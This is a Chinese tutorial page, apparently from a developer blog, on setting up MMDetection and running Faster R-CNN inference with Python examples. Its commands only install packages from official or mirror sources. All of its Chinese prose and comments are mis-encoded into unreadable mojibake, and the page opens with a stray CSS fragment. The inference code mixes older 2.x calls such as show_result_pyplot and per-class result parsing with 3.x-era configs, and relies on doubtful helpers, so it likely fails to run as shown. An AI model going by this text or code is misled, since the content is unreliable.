pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>MMDetection æ˜¯åŸºäº PyTorch çš„<strong>å¼€æºç›®æ ‡æ£€æµ‹å·¥å…·ç®±</strong>ï¼Œå±äº OpenMMLab ç”Ÿæ€ã€‚å®ƒå°è£…äº† Faster R-CNNã€YOLOã€RetinaNetã€Mask R-CNN ç­‰æ•°åç§ç»å…¸ç›®æ ‡æ£€æµ‹/åˆ†å‰²ç®—æ³•ï¼Œæ”¯æŒå¿«é€Ÿæ­å»ºã€è®­ç»ƒã€éªŒè¯å’Œéƒ¨ç½²ç›®æ ‡æ£€æµ‹æ¨¡å‹ï¼Œè§£å†³äº†ä¼ ç»Ÿç›®æ ‡æ£€æµ‹ä»»åŠ¡ä¸­ã€Œç®—æ³•å®ç°å¤æ‚ã€å·¥ç¨‹åŒ–éš¾åº¦é«˜ã€è°ƒå‚æ•ˆç‡ä½ã€çš„ç—›ç‚¹ï¼Œå¹¿æ³›åº”ç”¨äºç§‘ç ”å’Œå·¥ä¸šè½åœ°åœºæ™¯ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å‰ç½®å‡†å¤‡ï¼šç¯å¢ƒæ­å»ºä¸æ ¸å¿ƒä¾èµ–å®‰è£…</h2>
<h3 data-id="heading-1">1. æ ¸å¿ƒä¾èµ–è¯´æ˜</h3>
<p>MMDetection è¿è¡Œä¾èµ–ä¸‰å¤§æ ¸å¿ƒç»„ä»¶ï¼Œç‰ˆæœ¬å…¼å®¹æ€§è¦æ±‚ä¸¥æ ¼ï¼ˆéœ€é‡ç‚¹åŒ¹é…ï¼‰ï¼Œé¿å…å‡ºç°å®‰è£…å¤±è´¥æˆ–è¿è¡ŒæŠ¥é”™ï¼š</p>
<ul>
<li><code>PyTorch</code> &amp; <code>torchvision</code>ï¼šæ·±åº¦å­¦ä¹ æ ¸å¿ƒæ¡†æ¶ï¼Œæä¾›æ¨¡å‹è®­ç»ƒ/æ¨ç†çš„åº•å±‚æ”¯æŒï¼›</li>
<li><code>MMEngine</code>ï¼šOpenMMLab ç”Ÿæ€çš„æ ¸å¿ƒå¼•æ“ï¼Œæä¾›è®­ç»ƒè°ƒåº¦ã€é…ç½®ç®¡ç†ã€æ—¥å¿—è®°å½•ç­‰åŸºç¡€åŠŸèƒ½ï¼›</li>
<li><code>MMCV</code>ï¼šOpenMMLab ç”Ÿæ€çš„è®¡ç®—æœºè§†è§‰åŸºç¡€åº“ï¼Œæä¾›æ•°æ®å¢å¼ºã€æ¨¡å‹ç»„ä»¶ã€æ¨ç†åŠ é€Ÿç­‰å·¥å…·ï¼ˆ<strong>å¿…é¡»å®‰è£…å¸¦ CUDA æ”¯æŒçš„ç‰ˆæœ¬ï¼Œå¦åˆ™æ€§èƒ½å¤§å¹…ä¸‹é™</strong>ï¼‰ï¼›</li>
<li><code>MMDetection</code>ï¼šç›®æ ‡æ£€æµ‹å·¥å…·ç®±æ ¸å¿ƒï¼Œæä¾›å„ç±»ç›®æ ‡æ£€æµ‹ç®—æ³•å®ç°å’Œé…ç½®æ–‡ä»¶ã€‚</li>
</ul>
<h3 data-id="heading-2">2. ç¯å¢ƒæ­å»ºæ­¥éª¤ï¼ˆæ¨è conda è™šæ‹Ÿç¯å¢ƒï¼‰</h3>
<h4 data-id="heading-3">æ­¥éª¤ 1ï¼šåˆ›å»ºå¹¶æ¿€æ´» conda è™šæ‹Ÿç¯å¢ƒ</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»º Python 3.9 è™šæ‹Ÿç¯å¢ƒï¼ˆå…¼å®¹æ€§æœ€ä½³ï¼Œæ”¯æŒå¤§éƒ¨åˆ† MMDetection ç‰ˆæœ¬ï¼‰</span>
conda create -n mmdet_env python=3.9
<span class="hljs-comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span>
conda activate mmdet_env
</code></pre>
<h4 data-id="heading-4">æ­¥éª¤ 2ï¼šå®‰è£… PyTorchï¼ˆåŒ¹é… CUDA ç‰ˆæœ¬ï¼Œä¼˜å…ˆ GPU åŠ é€Ÿï¼‰</h4>
<p>MMDetection è¦æ±‚ PyTorch ç‰ˆæœ¬ â‰¥ 1.8.0ï¼Œæ¨èå®‰è£…å¯¹åº”æœ¬åœ° CUDA ç‰ˆæœ¬çš„ PyTorchï¼ˆæ—  GPU åˆ™å®‰è£… CPU ç‰ˆæœ¬ï¼Œä»…ç”¨äºå…¥é—¨æµ‹è¯•ï¼‰ã€‚</p>
<ul>
<li>
<p><strong>GPU ç‰ˆæœ¬ï¼ˆæ¨èï¼Œéœ€æå‰å®‰è£… CUDA 11.7+/12.0+ï¼‰</strong>
å‚è€ƒ <a href="https://link.juejin.cn?target=https%3A%2F%2Fpytorch.org%2F" target="_blank" title="https://pytorch.org/" ref="nofollow noopener noreferrer">PyTorch å®˜ç½‘</a> è·å–å¯¹åº”å®‰è£…å‘½ä»¤ï¼Œä»¥ CUDA 11.8 ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
</code></pre>
</li>
<li>
<p><strong>CPU ç‰ˆæœ¬ï¼ˆæ—  GPU è®¾å¤‡ï¼Œè¿è¡Œé€Ÿåº¦è¾ƒæ…¢ï¼‰</strong></p>
<pre><code class="hljs language-bash" lang="bash">pip3 install torch torchvision torchaudio
</code></pre>
</li>
</ul>
<h4 data-id="heading-5">æ­¥éª¤ 3ï¼šå®‰è£… MMCVï¼ˆå¸¦ CUDA åŠ é€Ÿï¼Œæ ¸å¿ƒå…³é”®æ­¥éª¤ï¼‰</h4>
<p>MMCV æä¾›ä¸¤ç§å®‰è£…æ–¹å¼ï¼Œ<strong>ä¼˜å…ˆé€‰æ‹©é¢„ç¼–è¯‘åŒ…å®‰è£…ï¼ˆå¿«é€Ÿæ— ç¼–è¯‘ï¼‰</strong>ï¼Œé¿å…æ‰‹åŠ¨ç¼–è¯‘è€—æ—¶ä¸”å®¹æ˜“æŠ¥é”™ã€‚</p>
<ol>
<li>
<p>æŸ¥çœ‹å½“å‰ç¯å¢ƒçš„ PyTorch ç‰ˆæœ¬å’Œ CUDA ç‰ˆæœ¬ï¼ˆéªŒè¯å…¼å®¹æ€§ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"PyTorch ç‰ˆæœ¬ï¼š<span class="hljs-subst">{torch.__version__}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"CUDA ç‰ˆæœ¬ï¼š<span class="hljs-subst">{torch.version.cuda}</span>"</span>)
</code></pre>
</li>
<li>
<p>ä¸‹è½½å¹¶å®‰è£… MMCV é¢„ç¼–è¯‘åŒ…ï¼ˆåŒ¹é… PyTorch å’Œ CUDA ç‰ˆæœ¬ï¼‰ï¼š
æ‰“å¼€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdownload.openmmlab.com%2Fmmcv%2Fdist%2F" target="_blank" title="https://download.openmmlab.com/mmcv/dist/" ref="nofollow noopener noreferrer">MMCV é¢„ç¼–è¯‘åŒ…ä¸‹è½½åœ°å€</a>ï¼Œæ‰¾åˆ°å¯¹åº”ã€ŒPyTorch ç‰ˆæœ¬ã€ã€ŒCUDA ç‰ˆæœ¬ã€ã€ŒPython ç‰ˆæœ¬ã€çš„é¢„ç¼–è¯‘åŒ…ï¼Œå¤åˆ¶ä¸‹è½½é“¾æ¥ï¼Œä½¿ç”¨ pip å®‰è£…ï¼ˆä»¥ PyTorch 2.0.0ã€CUDA 11.8ã€Python 3.9 ä¸ºä¾‹ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pip install mmcv==2.0.1 -f https://download.openmmlab.com/mmcv/dist/cu118/torch2.0.0/index.html -i https://pypi.tuna.tsinghua.edu.cn/simple
</code></pre>
<p>å›½å†…ç”¨æˆ·å¯ä½¿ç”¨æ¸…åé•œåƒåŠ é€Ÿï¼Œé¿å…ä¸‹è½½è¶…æ—¶ã€‚</p>
</li>
</ol>
<h4 data-id="heading-6">æ­¥éª¤ 4ï¼šå®‰è£… MMDetectionï¼ˆæ ¸å¿ƒå·¥å…·ç®±ï¼‰</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼ 1ï¼šå®‰è£…ç¨³å®šç‰ˆï¼ˆæ¨èï¼Œè½åœ°ä¼˜å…ˆï¼‰</span>
pip install mmdet -i https://pypi.tuna.tsinghua.edu.cn/simple

<span class="hljs-comment"># æ–¹å¼ 2ï¼šå®‰è£…æœ€æ–°å¼€å‘ç‰ˆï¼ˆé€‚åˆç§‘ç ”ï¼Œè·å–æœ€æ–°ç®—æ³•ï¼‰</span>
git <span class="hljs-built_in">clone</span> https://github.com/open-mmlab/mmdetection.git
<span class="hljs-built_in">cd</span> mmdetection
pip install -e . -i https://pypi.tuna.tsinghua.edu.cn/simple
</code></pre>
<h4 data-id="heading-7">æ­¥éª¤ 5ï¼šç¯å¢ƒéªŒè¯ï¼ˆç¡®è®¤å®‰è£…æˆåŠŸï¼‰</h4>
<p>è¿è¡Œä»¥ä¸‹ä»£ç ï¼ŒéªŒè¯ MMDetection æ˜¯å¦å®‰è£…æˆåŠŸï¼Œå¹¶æŸ¥çœ‹æ”¯æŒçš„æ¨¡å‹åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> mmdet
<span class="hljs-keyword">from</span> mmdet.apis <span class="hljs-keyword">import</span> init_detector, inference_detector

<span class="hljs-comment"># éªŒè¯åº“å¯¼å…¥æ˜¯å¦æˆåŠŸ</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"MMDetection ç‰ˆæœ¬ï¼š<span class="hljs-subst">{mmdet.__version__}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"MMDetection ç¯å¢ƒé…ç½®æˆåŠŸï¼"</span>)

<span class="hljs-comment"># æŸ¥çœ‹å†…ç½®æ¨¡å‹é…ç½®æ–‡ä»¶ï¼ˆéƒ¨åˆ†æ ¸å¿ƒæ¨¡å‹ï¼‰</span>
<span class="hljs-keyword">from</span> mmdet.utils <span class="hljs-keyword">import</span> get_config_file
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\næ ¸å¿ƒæ¨¡å‹é…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼š"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Faster R-CNN é…ç½®ï¼š"</span>, get_config_file(<span class="hljs-string">"faster_rcnn/faster-rcnn_r50_fpn_1x_coco.py"</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"YOLOv3 é…ç½®ï¼š"</span>, get_config_file(<span class="hljs-string">"yolo/yolov3_d53_mstrain-608_273e_coco.py"</span>))
</code></pre>
<h3 data-id="heading-8">3. å…³é”®ç‰ˆæœ¬å…¼å®¹æ€§è¯´æ˜ï¼ˆé¿å‘æ ¸å¿ƒï¼‰</h3>























<table><thead><tr><th>MMDetection ç‰ˆæœ¬</th><th>MMCV ç‰ˆæœ¬</th><th>PyTorch ç‰ˆæœ¬</th><th>CUDA ç‰ˆæœ¬</th></tr></thead><tbody><tr><td>3.0.0+ï¼ˆç¨³å®šç‰ˆï¼‰</td><td>2.0.0+</td><td>1.8.0 - 2.0.0</td><td>11.1+</td></tr><tr><td>2.28.0+</td><td>1.7.0+</td><td>1.6.0 - 1.13.0</td><td>10.2+</td></tr></tbody></table>
<p><strong>è½åœ°å»ºè®®</strong>ï¼šä¼˜å…ˆé€‰æ‹©ä¸Šè¡¨ä¸­çš„ç¨³å®šç‰ˆç»„åˆï¼Œé¿å…ç‰ˆæœ¬ä¸åŒ¹é…å¯¼è‡´çš„å„ç±»æŠ¥é”™ï¼ˆå¦‚ <code>ModuleNotFoundError</code>ã€<code>CUDA error</code> ç­‰ï¼‰ã€‚</p>
<h2 data-id="heading-9">äºŒã€MMDetection æ ¸å¿ƒè®¤çŸ¥ï¼šæ¶æ„ä¸æ ¸å¿ƒæ¦‚å¿µ</h2>
<h3 data-id="heading-10">1. æ•´ä½“æ¶æ„ï¼ˆOpenMMLab ç”Ÿæ€ï¼‰</h3>
<p>MMDetection åŸºäº OpenMMLab ç”Ÿæ€æ„å»ºï¼Œæ ¸å¿ƒä¾èµ–ã€ŒMMEngineã€å’Œã€ŒMMCVã€ï¼Œæ•´ä½“æ¶æ„åˆ†å±‚æ¸…æ™°ï¼š</p>
<ul>
<li><strong>åº•å±‚ï¼šMMEngine</strong>ï¼šæä¾›è®­ç»ƒè°ƒåº¦ã€ä¼˜åŒ–å™¨ç®¡ç†ã€æ—¥å¿—è®°å½•ã€ checkpoint ä¿å­˜ç­‰é€šç”¨åŠŸèƒ½ï¼Œæ— éœ€é‡å¤å¼€å‘ï¼›</li>
<li><strong>ä¸­å±‚ï¼šMMCV</strong>ï¼šæä¾›è®¡ç®—æœºè§†è§‰ä¸“å±å·¥å…·ï¼Œå¦‚æ•°æ®å¢å¼ºã€å›¾åƒé¢„å¤„ç†ã€æ¨¡å‹ç»„ä»¶ï¼ˆå·ç§¯å±‚ã€æ³¨æ„åŠ›å±‚ï¼‰ã€æ¨ç†åŠ é€Ÿç­‰ï¼›</li>
<li><strong>ä¸Šå±‚ï¼šMMDetection</strong>ï¼šå°è£…å„ç±»ç›®æ ‡æ£€æµ‹/åˆ†å‰²ç®—æ³•ï¼ˆFaster R-CNNã€YOLO ç­‰ï¼‰ï¼Œæä¾›å®Œæ•´çš„é…ç½®æ–‡ä»¶å’Œè®­ç»ƒ/æ¨ç†æ¥å£ï¼Œç”¨æˆ·å¯å¿«é€Ÿè°ƒç”¨å’Œä¿®æ”¹ã€‚</li>
</ul>
<h3 data-id="heading-11">2. æ ¸å¿ƒæ¦‚å¿µï¼ˆå¿«é€Ÿä¸Šæ‰‹å…³é”®ï¼‰</h3>
<h4 data-id="heading-12">ï¼ˆ1ï¼‰ é…ç½®æ–‡ä»¶ï¼ˆ*.pyï¼‰</h4>
<p>MMDetection çš„æ ¸å¿ƒæ˜¯ã€Œé…ç½®é©±åŠ¨ã€ï¼Œæ‰€æœ‰æ¨¡å‹å‚æ•°ã€è®­ç»ƒå‚æ•°ã€æ•°æ®é›†å‚æ•°éƒ½é€šè¿‡é…ç½®æ–‡ä»¶ç®¡ç†ï¼Œæ— éœ€ä¿®æ”¹æ ¸å¿ƒä»£ç ã€‚é…ç½®æ–‡ä»¶æ”¯æŒã€Œç»§æ‰¿ã€å’Œã€Œè¦†ç›–ã€ï¼Œå¯åŸºäºå®˜æ–¹é»˜è®¤é…ç½®å¿«é€Ÿä¿®æ”¹ï¼Œå¤§å¹…æå‡è°ƒå‚æ•ˆç‡ã€‚</p>
<p>å®˜æ–¹é»˜è®¤é…ç½®æ–‡ä»¶ä½äº <code>mmdet/configs/</code> ç›®å½•ä¸‹ï¼ŒæŒ‰ç®—æ³•åˆ†ç±»ï¼ˆå¦‚ <code>faster_rcnn/</code>ã€<code>yolo/</code>ï¼‰ï¼Œæ¯ä¸ªç®—æ³•æä¾›å¤šä¸ªä¸åŒè§„æ¨¡çš„é…ç½®ï¼ˆå¦‚ <code>r50_fpn</code>ã€<code>r101_fpn</code>ï¼‰ã€‚</p>
<h4 data-id="heading-13">ï¼ˆ2ï¼‰ é¢„è®­ç»ƒæ¨¡å‹æƒé‡ï¼ˆ*.pthï¼‰</h4>
<p>å®˜æ–¹æä¾›äº†å¤§é‡åŸºäº COCO æ•°æ®é›†è®­ç»ƒçš„é¢„è®­ç»ƒæ¨¡å‹æƒé‡ï¼Œå¯ç›´æ¥ç”¨äºæ¨ç†æˆ–è¿ç§»å­¦ä¹ ï¼Œä¸‹è½½åœ°å€ä½äºé…ç½®æ–‡ä»¶å¯¹åº”çš„æ³¨é‡Šä¸­ï¼Œæˆ–é€šè¿‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdownload.openmmlab.com%2Fmmdetection%2F" target="_blank" title="https://download.openmmlab.com/mmdetection/" ref="nofollow noopener noreferrer">OpenMMLab æ¨¡å‹åº“</a> è·å–ã€‚</p>
<p>é¢„è®­ç»ƒæƒé‡ä¼šè‡ªåŠ¨ç¼“å­˜åˆ° <code>~/.cache/mmdet/</code> ç›®å½•ä¸‹ï¼Œè‹¥ä¸‹è½½å¤±è´¥å¯æ‰‹åŠ¨ä¸‹è½½åæ”¾å…¥è¯¥ç›®å½•ã€‚</p>
<h4 data-id="heading-14">ï¼ˆ3ï¼‰ æ•°æ®é›†æ ¼å¼ï¼ˆCOCO / VOCï¼‰</h4>
<p>MMDetection åŸç”Ÿæ”¯æŒ COCO å’Œ VOC ä¸¤ç§ä¸»æµç›®æ ‡æ£€æµ‹æ•°æ®é›†æ ¼å¼ï¼Œå…¶ä¸­ COCO æ ¼å¼ç”¨äºå¤§è§„æ¨¡è®­ç»ƒï¼ŒVOC æ ¼å¼ç”¨äºå°å‹è‡ªå®šä¹‰æ•°æ®é›†ï¼Œåç»­å®æˆ˜å°†ä»¥ VOC æ ¼å¼ä¸ºä¾‹ï¼ˆæ›´æ˜“æ ‡æ³¨å’Œè½åœ°ï¼‰ã€‚</p>
<h2 data-id="heading-15">ä¸‰ã€å¿«é€Ÿå…¥é—¨ï¼šé¢„è®­ç»ƒæ¨¡å‹æ¨ç†ï¼ˆæ— éœ€è®­ç»ƒï¼Œç›´æ¥è½åœ°ï¼‰</h2>
<p>ä½¿ç”¨ MMDetection å®˜æ–¹é¢„è®­ç»ƒæ¨¡å‹ï¼Œå¯å¿«é€Ÿå®ç°å•å¼ å›¾ç‰‡ã€æ‰¹é‡å›¾ç‰‡ã€è§†é¢‘çš„ç›®æ ‡æ£€æµ‹æ¨ç†ï¼Œæ ¸å¿ƒæµç¨‹ä¸ºã€Œ<strong>åŠ è½½é…ç½®æ–‡ä»¶â†’åŠ è½½é¢„è®­ç»ƒæƒé‡â†’åˆå§‹åŒ–æ¨¡å‹â†’æ‰§è¡Œæ¨ç†â†’ç»“æœå¯è§†åŒ–ä¸ä¿å­˜</strong>ã€ã€‚</p>
<h3 data-id="heading-16">å®Œæ•´å®æˆ˜ä»£ç ï¼ˆFaster R-CNN æ¨¡å‹ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> cv2
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> mmdet.apis <span class="hljs-keyword">import</span> init_detector, inference_detector, show_result_pyplot

<span class="hljs-comment"># 1. é…ç½®å‚æ•°è®¾ç½®ï¼ˆæ ¸å¿ƒï¼šé…ç½®æ–‡ä»¶è·¯å¾„ + é¢„è®­ç»ƒæƒé‡è·¯å¾„ï¼‰</span>
config_file = <span class="hljs-string">"faster_rcnn/faster-rcnn_r50_fpn_1x_coco.py"</span>  <span class="hljs-comment"># æ¨¡å‹é…ç½®æ–‡ä»¶</span>
checkpoint_file = <span class="hljs-literal">None</span>  <span class="hljs-comment"># é¢„è®­ç»ƒæƒé‡ï¼ˆNone è¡¨ç¤ºè‡ªåŠ¨ä¸‹è½½å®˜æ–¹é¢„è®­ç»ƒæƒé‡ï¼‰</span>
img_path = <span class="hljs-string">"test_cat_dog.jpg"</span>  <span class="hljs-comment"># æµ‹è¯•å›¾åƒè·¯å¾„ï¼ˆæ›¿æ¢ä¸ºä½ çš„æµ‹è¯•å›¾åƒï¼‰</span>
output_dir = <span class="hljs-string">"mmdet_inference_results"</span>  <span class="hljs-comment"># æ¨ç†ç»“æœä¿å­˜ç›®å½•</span>

<span class="hljs-comment"># 2. åˆ›å»ºç»“æœä¿å­˜ç›®å½•</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_dir):
    os.makedirs(output_dir)

<span class="hljs-comment"># 3. é…ç½®è®¾å¤‡ï¼ˆä¼˜å…ˆä½¿ç”¨ GPUï¼Œæ—  GPU åˆ™ä½¿ç”¨ CPUï¼‰</span>
device = <span class="hljs-string">"cuda:0"</span> <span class="hljs-keyword">if</span> cv2.cuda.getDeviceCount() &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"cpu"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ä½¿ç”¨è®¾å¤‡ï¼š<span class="hljs-subst">{device}</span>"</span>)

<span class="hljs-comment"># 4. åˆå§‹åŒ–ç›®æ ‡æ£€æµ‹æ¨¡å‹ï¼ˆåŠ è½½é…ç½® + é¢„è®­ç»ƒæƒé‡ï¼‰</span>
model = init_detector(
    config_file,
    checkpoint_file,
    device=device,
    cfg_options=<span class="hljs-literal">None</span>  <span class="hljs-comment"># é¢å¤–é…ç½®è¦†ç›–ï¼ˆæ— éœ€ä¿®æ”¹æ—¶è®¾ä¸º Noneï¼‰</span>
)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¨¡å‹åˆå§‹åŒ–æˆåŠŸï¼Œå¼€å§‹æ‰§è¡Œæ¨ç†..."</span>)

<span class="hljs-comment"># 5. æ‰§è¡Œæ¨ç†ï¼ˆæ”¯æŒå•å¼ å›¾ç‰‡ã€æ‰¹é‡å›¾ç‰‡ã€è§†é¢‘å¸§ï¼‰</span>
result = inference_detector(model, img_path)

<span class="hljs-comment"># 6. ç»“æœå¯è§†åŒ–ä¸ä¿å­˜</span>
<span class="hljs-comment"># æ–¹å¼ 1ï¼šä½¿ç”¨å®˜æ–¹è‡ªå¸¦å¯è§†åŒ–å·¥å…·ï¼Œç›´æ¥æ˜¾ç¤ºå¹¶ä¿å­˜</span>
show_result_pyplot(
    model,
    img_path,
    result,
    score_thr=<span class="hljs-number">0.5</span>,  <span class="hljs-comment"># ç½®ä¿¡åº¦é˜ˆå€¼ï¼Œè¿‡æ»¤ä½ç½®ä¿¡åº¦æ£€æµ‹æ¡†</span>
    out_file=os.path.join(output_dir, <span class="hljs-string">"inference_result.jpg"</span>)  <span class="hljs-comment"># ä¿å­˜ç»“æœå›¾åƒ</span>
)

<span class="hljs-comment"># æ–¹å¼ 2ï¼šæ‰‹åŠ¨è§£ææ£€æµ‹ç»“æœï¼Œè‡ªå®šä¹‰ç»˜åˆ¶ï¼ˆæ›´çµæ´»ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">visualize_custom_result</span>(<span class="hljs-params">img_path, result, model, score_thr=<span class="hljs-number">0.5</span>, save_path=<span class="hljs-literal">None</span></span>):
    <span class="hljs-string">"""
    è‡ªå®šä¹‰å¯è§†åŒ–æ£€æµ‹ç»“æœï¼šç»˜åˆ¶æ£€æµ‹æ¡†ã€ç±»åˆ«ã€ç½®ä¿¡åº¦
    """</span>
    <span class="hljs-comment"># è¯»å–åŸå§‹å›¾åƒ</span>
    img = cv2.imread(img_path)
    <span class="hljs-keyword">if</span> img <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"æ— æ³•è¯»å–å›¾åƒï¼Œè¯·æ£€æŸ¥æ–‡ä»¶è·¯å¾„æ˜¯å¦æ­£ç¡®"</span>)
    img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
    
    <span class="hljs-comment"># è§£ææ£€æµ‹ç»“æœï¼ˆMMDetection è¾“å‡ºæ ¼å¼ï¼š(ç±»åˆ«æ•°, æ£€æµ‹æ¡†æ•°, 5)ï¼Œæœ€åä¸€ç»´ä¸º [x1, y1, x2, y2, ç½®ä¿¡åº¦]ï¼‰</span>
    class_names = model.CLASSES
    <span class="hljs-keyword">for</span> cls_idx, cls_result <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(result):
        <span class="hljs-keyword">for</span> bbox <span class="hljs-keyword">in</span> cls_result:
            x1, y1, x2, y2, score = bbox
            <span class="hljs-keyword">if</span> score &lt; score_thr:
                <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># è¿‡æ»¤ä½ç½®ä¿¡åº¦æ£€æµ‹æ¡†</span>
            
            <span class="hljs-comment"># ç»˜åˆ¶æ£€æµ‹æ¡†ï¼ˆçº¢è‰²ï¼Œçº¿å®½ 2ï¼‰</span>
            cv2.rectangle(img, (<span class="hljs-built_in">int</span>(x1), <span class="hljs-built_in">int</span>(y1)), (<span class="hljs-built_in">int</span>(x2), <span class="hljs-built_in">int</span>(y2)), (<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), <span class="hljs-number">2</span>)
            
            <span class="hljs-comment"># ç»˜åˆ¶ç±»åˆ«ä¸ç½®ä¿¡åº¦æ ‡ç­¾ï¼ˆç™½è‰²èƒŒæ™¯ï¼Œé»‘è‰²æ–‡å­—ï¼‰</span>
            label = <span class="hljs-string">f"<span class="hljs-subst">{class_names[cls_idx]}</span> <span class="hljs-subst">{score:<span class="hljs-number">.2</span>f}</span>"</span>
            label_size, _ = cv2.getTextSize(label, cv2.FONT_HERSHEY_SIMPLEX, <span class="hljs-number">0.5</span>, <span class="hljs-number">1</span>)
            y1_label = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">int</span>(y1), label_size[<span class="hljs-number">1</span>] + <span class="hljs-number">10</span>)
            cv2.rectangle(
                img,
                (<span class="hljs-built_in">int</span>(x1), y1_label - label_size[<span class="hljs-number">1</span>] - <span class="hljs-number">10</span>),
                (<span class="hljs-built_in">int</span>(x1) + label_size[<span class="hljs-number">0</span>], y1_label),
                (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>),
                -<span class="hljs-number">1</span>
            )
            cv2.putText(
                img,
                label,
                (<span class="hljs-built_in">int</span>(x1), y1_label - <span class="hljs-number">5</span>),
                cv2.FONT_HERSHEY_SIMPLEX,
                <span class="hljs-number">0.5</span>,
                (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
                <span class="hljs-number">1</span>
            )
    
    <span class="hljs-comment"># ä¿å­˜ç»“æœå›¾åƒï¼ˆè½¬æ¢å› BGR æ ¼å¼ï¼Œé€‚é… cv2 ä¿å­˜ï¼‰</span>
    <span class="hljs-keyword">if</span> save_path <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        img_bgr = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
        cv2.imwrite(save_path, img_bgr)
    
    <span class="hljs-keyword">return</span> img

<span class="hljs-comment"># è‡ªå®šä¹‰å¯è§†åŒ–å¹¶ä¿å­˜ç»“æœ</span>
custom_result_img = visualize_custom_result(
    img_path,
    result,
    model,
    score_thr=<span class="hljs-number">0.5</span>,
    save_path=os.path.join(output_dir, <span class="hljs-string">"custom_inference_result.jpg"</span>)
)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¨ç†å®Œæˆï¼Œç»“æœå·²ä¿å­˜è‡³ <span class="hljs-subst">{output_dir}</span> ç›®å½•"</span>)
</code></pre>
<h3 data-id="heading-17">æ ¸å¿ƒçŸ¥è¯†ç‚¹è§£æ</h3>
<ol>
<li><strong>æ¨¡å‹åˆå§‹åŒ–</strong>ï¼š<code>init_detector()</code> è´Ÿè´£åŠ è½½é…ç½®æ–‡ä»¶å’Œé¢„è®­ç»ƒæƒé‡ï¼Œè‡ªåŠ¨å®Œæˆæ¨¡å‹æ„å»ºå’Œè®¾å¤‡éƒ¨ç½²ï¼Œæ— éœ€æ‰‹åŠ¨å®šä¹‰ç½‘ç»œç»“æ„ï¼›</li>
<li><strong>æ¨ç†æ‰§è¡Œ</strong>ï¼š<code>inference_detector()</code> æ”¯æŒå•å¼ å›¾ç‰‡ï¼ˆå­—ç¬¦ä¸²è·¯å¾„ï¼‰ã€æ‰¹é‡å›¾ç‰‡ï¼ˆåˆ—è¡¨è·¯å¾„ï¼‰ã€è§†é¢‘å¸§ï¼ˆnumpy æ•°ç»„ï¼‰è¾“å…¥ï¼Œè¿”å›æ ¼å¼ä¸ºç¬¦åˆ MMDetection è§„èŒƒçš„æ£€æµ‹ç»“æœï¼›</li>
<li><strong>ç½®ä¿¡åº¦é˜ˆå€¼</strong>ï¼š<code>score_thr=0.5</code> è¿‡æ»¤ç½®ä¿¡åº¦ä½äº 0.5 çš„æ£€æµ‹æ¡†ï¼Œå‡å°‘è¯¯æ£€ï¼Œå¯æ ¹æ®åœºæ™¯è°ƒæ•´ï¼ˆå¦‚é«˜ç²¾åº¦åœºæ™¯è®¾ä¸º 0.7ï¼Œä½æ¼æ£€åœºæ™¯è®¾ä¸º 0.3ï¼‰ï¼›</li>
